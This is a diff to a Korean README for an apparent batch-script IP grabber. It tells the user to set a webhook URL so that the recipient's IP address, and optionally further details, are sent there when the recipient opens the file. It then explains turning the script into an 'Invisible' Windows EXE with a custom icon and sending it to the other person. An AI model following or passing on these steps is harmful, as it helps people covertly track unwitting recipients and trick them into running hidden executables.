@@ -38,7 +38,7 @@ Rem ----------------------------------------------------------------------------
 ``` batch
 SET WEBHOOK_URL=webhooklink
 ```
-에서 webhooklink 대신 상대방의 아이피가 오길 원하는 웹훅크의 링크를 써주세요.
+에서 webhooklink 대신 상대방이 파일을 열떄 상대방의 아이피가 오길 원하는 웹훅크의 링크를 써주세요.
 <br/><br/>
 - 고급 정보 Send (선택)
 
@@ -57,8 +57,9 @@ SET Provide_additional_information=TRUE
 오른쪽에 Option 에서 Exe-Format 에서 "64 BitㅣWindows (Invisible)" 아니면 "32 BitㅣWindows (Invisible)"선택 <br/>
 Option에는 많은 옵션들이 있습니다.주요 옵션에 이것들이 있습니다.<br>
 * ICON : EXE 파일 아이콘 설정
-* UAC : EXE 파일을 사용하기 위해 사용자권한, 관리자권한 요구<br/>
-Version Information 에선 EXE 파일 버전을 자세히 편집할 수 있습니다(필수아님)<br/>
+* UAC : EXE 파일을 사용하기 위해 사용자권한, 관리자권한 요구
+Version Information 에선 EXE 파일의 버전을 자세히 편집할 수 있습니다(필수아님)
+<br/>
 다 설정하셨다면  Convert 를 눌르고 EXE 파일 이름을 입력하고 저장하면 EXE 파일이 생성됩니다.<br/>
 EXE 파일을 상대에게 보내보세요!
 </details>
